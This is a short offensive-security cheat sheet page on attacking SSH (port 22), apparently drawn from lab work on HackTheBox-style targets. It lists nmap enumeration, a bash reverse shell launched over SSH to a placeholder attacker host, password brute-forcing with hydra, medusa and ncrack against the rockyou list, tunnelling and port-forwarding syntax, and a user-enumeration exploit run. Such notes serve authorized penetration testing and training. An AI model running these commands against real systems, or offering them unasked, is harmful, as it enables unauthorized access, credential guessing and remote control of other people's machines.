---
title: "PORT 22 - SSH"
draft: false
images: []
menu:
  docs:
    parent: "Ports"
weight: 22
toc: true
---

### SSH ENUM
```
nmap -p22 -n -sV --script ssh2-enum-algos 192.168.10.221
nmap -p 22 --script ssh-auth-methods --script-args="ssh.user=<username>" <target>
```
### CONNECT TO ANOTHER PORT
```
ssh -p 22022 sunny@10.10.10.76
ERROR: Unable to negotiate with 10.10.10.76 port 22022: no matching key exchange method found. Their offer: gss-group1-sha1-toWM5Slw5Ew8Mqkay+al2g==,diffie-hellman-group-exchange-sha1,diffie-hellman-group1-sha1

ssh -p 22022 sunny@10.10.10.76 -oKexALgorithms=+diffie-hellman-group1-sha1
```
### REVERSE SHELL
```
ssh -p 22022 sunny@10.10.10.76 -oKexALgorithms=+diffie-hellman-group1-sha1 -t '/bin/bash -i >& /dev/tcp/<ip_attacker>/<port_attacker> 0>&1'
```
### BRUTE FORCE
```
hydra -l user -P /usr/share/wordlists/password/rockyou.txt -e s ssh://10.10.1.111

medusa -h 10.10.1.111 -u user -P /usr/share/wordlists/password/rockyou.txt -e s -M ssh

ncrack --user user -P /usr/share/wordlists/password/rockyou.txt ssh://10.10.1.111
```
#### SSH TUNNELING
```
ssh -L <localPort>:<ipVictimLocal>:<portVictimForService> <user>@<ipVictim> (FROM ATTACKER BOX)
ssh -L 4444:127.0.0.1:5901 charix@10.10.10.84
```
### LOCAL PORT FORWARDING
```
ssh <gateway> -L <local port to listen>:<remote host>:<remote port>
```
### REMOTE PORT FORWARDING
```
ssh <gateway> -R <remote port to bind>:<local host>:<local port>
```
### DINAMIC PORT FORWARDING
```
ssh -D <local proxy port> -p <remote port> <target>
```
### ENUM USERS < 7.7
```
https://github.com/six2dez/ssh_enum_script
https://www.exploit-db.com/exploits/45233
python ssh_user_enum.py --port 2223 --userList /root/Downloads/users.txt IP 2>/dev/null 
```